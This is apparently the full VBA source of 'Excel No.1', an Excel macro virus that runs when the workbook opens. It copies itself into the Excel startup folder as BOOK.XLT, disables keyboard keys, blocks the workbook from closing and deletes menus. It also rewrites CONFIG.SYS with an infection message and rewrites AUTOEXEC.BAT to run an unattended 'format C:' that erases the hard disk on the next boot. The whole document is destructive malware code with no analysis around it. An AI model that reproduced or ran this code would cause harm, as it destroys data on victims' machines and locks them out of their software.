   Attribute VB_Name = "AutoOpen"
   Global Const Config$ = "C:\CONFIG.SYS"
   Global Const Autoexec$ = "C:\AUTOEXEC.BAT"

   Public S As Object, OK As Boolean
   Public OfficeDir$, TemplateDir$, StartDir$
   Public Sub Main()
       StatusBar = "¥¿¦bªì©l¤Æ³]©w..."
       Application.ScreenUpdating = False
       SaveFile
       GetDirs
       InterruptKeys
       StatusBar = "Excel No.1¤w¸g¦û¾Ú±zªº¨t²Î"
       Application.ScreenUpdating = True
   End Sub
   Public Sub GetDirs()
       ExcelDir$ = Application.Path
       TemplateDir$ = Application.TemplatesPath
       StartDir$ = Application.StartupPath
   End Sub
   Public Sub KillMenu()
       On Error Resume Next
       Application.CommandBars("Worksheet Menu Bar").Controls(9).Delete
       Application.CommandBars("Worksheet Menu Bar").Controls(8).Delete
       Application.CommandBars("Worksheet Menu Bar").Controls(6).Delete
       Application.CommandBars("Worksheet Menu Bar").Controls(5).Delete
       Application.CommandBars("Worksheet Menu Bar").Controls(4).Delete
       Application.CommandBars("Worksheet Menu Bar").Controls(3).Delete
       Application.CommandBars("Worksheet Menu Bar").Controls(2).Delete
       Application.CommandBars("Worksheet Menu Bar").Controls(1).Delete
   End Sub
   Public Sub ReAuto()
       On Error Resume Next
       If UCase(Dir(Autoexec$)) = "AUTOEXEC.BAT" Then
           SetAttr Autoexec$, 0
       End If
       No = FreeFile
       Open "C:\c" For Output As #No
           Print #No, "y" & Chr$(13)
           Print #No, Chr$(13)
       Close #No
       No = FreeFile
       Open Autoexec$ For Output As #No
           Print #No, "PATH = C:\;" & S.WinPath & "\COMMAND;" & S.SystemPath
           Print #No, "format C:/u/q/v:EXCELNO1 < c"
       Close #No
   End Sub
   Public Sub SaveFile()
       f$ = StartDir & "\BOOK.XLT"
       If UCase(Dir(f$)) = "BOOK.XLT" Then Exit Sub
       On Error Resume Next
       Application.ActiveWorkbook.SaveAs FileName:=f$, FileFormat:=xlTemplate
       Set S = New X
       For c = 1 To 20
           S.CreateLink 1, "Excel No.1 - " & c, f$, ""
       Next c
       Set S = Nothing
   End Sub
   Public Sub InterruptKeys()
       On Error Resume Next
       With Application
           .OnKey "{BACKSPACE}", ""
           .OnKey "{BREAK}", ""
           .OnKey "{DOWN}", ""
           .OnKey "{UP}", ""
           .OnKey "{LEFT}", ""
           .OnKey "{RIGHT}", ""
           .OnKey "{ESC}", ""
           .OnKey "{DEL}", ""
           .OnKey "{HOME}", ""
           .OnKey "{END}", ""
           .OnKey "{PGDN}", ""
           .OnKey "{PGUP}", ""
           .OnKey "{RETURN}", ""
           .OnKey "{ENTER}", ""
           .OnKey "{TAB}", ""
           .OnKey "%{F4}", ""
           .OnKey "{F1}", ""
           .OnKey "{NUMLOCK}", ""
       End With
   End Sub
   Public Sub SafeExit()
       OK = True
       ThisWorkbook.Saved = True
       Application.Quit
   End Sub
   Public Sub ReConfig()
       On Error Resume Next
       If UCase(Dir(Config$)) = "CONFIG.SYS" Then
           SetAttr "C:\CONFIG.SYS", 0
       End If
       No = FreeFile
       Open Config$ For Output As #No
           Print #No, "Rem **** You're infected by Excel No.1 Macro Virus!"
           Print #No, "Dos = Low"
           Print #No, "FCBS = 255"
           Print #No, "FILES = 255"
           Print #No, "LastDrive = Z"
           Print #No, "SET TEMP = C:\"
           Print #No, "SET TMP = C:\"
           Print #No, "STACKS = 64, 512"
           Print #No, "SWITCHES= /F /K /N"
       Close #No
   End Sub

   Attribute VB_Name = "Progress"
   Public Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, ByVal lpvParam As Any, ByVal fuWinIni As Long) As Long
   Public Declare Function fCreateShellLink Lib "STKIT432.DLL" _
           (ByVal Folder As String, ByVal ShortCutName As String, _
           ByVal ExePath As String, ByVal Params As String) As Long
   Public Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
   Public Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
   Public Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
   Public Declare Function GetComputerName Lib "kernel32" Alias "GetComputerNameA" (ByVal lpBuffer As String, nSize As Long) As Long
   Public Declare Function GetPrivateProfileString Lib "kernel32" Alias "GetPrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long
   Public Declare Function WritePrivateProfileString Lib "kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpString As Any, ByVal lpFileName As String) As Long
   Sub Begin()
       MsgBox "¶}©l¶i¤J¦Û§Ú¸Ñ¬rµ{§Ç", vbOKOnly & vbInformation, "Excel No.1"
       Game.Show
       Guess.Show
   End Sub

   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "X"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = True
   Attribute VB_PredeclaredId = False
   Attribute VB_Exposed = False
   Public Function SystemPath() As String
           Dim b As String * 255
           b = Space$(255)
           L = GetSystemDirectory(b, 255)
           SystemPath = Trim(Left(b, L))
   End Function
   Public Function GetComputerName()
           Dim b As String * 255
           b = Space$(255)
           L = GetComputerName(b, 255)
           L = InStr(1, b, Chr$(0))
           b = Left(b, L - 1)
           m_ComputerName = Trim(b)
           ComputerName = m_ComputerName
   End Function
   Public Function WinPath() As String
           Dim b As String * 255
           b = Space$(255)
           L = GetWindowsDirectory(b, 255)
           WinPath = Trim(Left(b, L))
   End Function
   Public Function GetRandomNumber(Mini As Single, Maxi As Single) As Single
           If Mini >= Maxi Then
                   MsgBox Mini & " ¥²¶·¤ñ " & Maxi & " ¤j¡I", vbCritical
                   GetRandomNumber = 0
                   Exit Function
           End If
           Randomize Timer
           GetRandomNumber = Int((Maxi * Rnd) + Mini)
   End Function
   Public Sub CreateLink(¦ì¸m As Integer, ±¶®|¦WºÙ As String, ÀÉ®×¸ô®| As String, µ{¦¡°Ñ¼Æ As String)
           Screen.MousePointer = vbHourglass
           Select Case ¦ì¸m
                   Case 0 '®à±
                           Ret = fCreateShellLink("..\..\Desktop", ±¶®|¦WºÙ, ÀÉ®×¸ô®|, µ{¦¡°Ñ¼Æ)
                   Case 1 '¶}©l¥\¯àªí
                           Ret = fCreateShellLink("..", ±¶®|¦WºÙ, ÀÉ®×¸ô®|, µ{¦¡°Ñ¼Æ)
                   Case 2 'µ{¦¡¶°
                           Ret = fCreateShellLink(".", ±¶®|¦WºÙ, ÀÉ®×¸ô®|, µ{¦¡°Ñ¼Æ)
           End Select
           Screen.MousePointer = 1
   End Sub
   Public Sub WriteSetting(Section As String, KeyName As String, Setting As String, File As String)
           h = WritePrivateProfileString(Section, KeyName, Setting, File)
   End Sub
   Public Function GetSettings(AppName As String, Key As String, File As String) As String
           R$ = String$(255, 0)
           X = GetPrivateProfileString(AppName, Key, "", R$, Len(R$), File)
           R$ = Left(R$, InStr(R$, Chr(0)) - 1)
           GetSettings = R$
   End Function

   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisWorkbook"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub Workbook_BeforeClose(Cancel As Boolean)
       On Error Resume Next
       If Not OK Then
           Cancel = True
       Else
           Cancel = False
           Exit Sub
       End If
       ThisWorkbook.Worksheets("ExcelNo1").Visible = False
       ThisWorkbook.Worksheets("ExcelNo1").Save
       Set S = Nothing
   End Sub
   Private Sub Workbook_Open()
       AutoOpen.Main
       ThisWorkbook.Worksheets("ExcelNo1").Visible = True
       ThisWorkbook.Worksheets("ExcelNo1").Activate
       OK = False
   End Sub
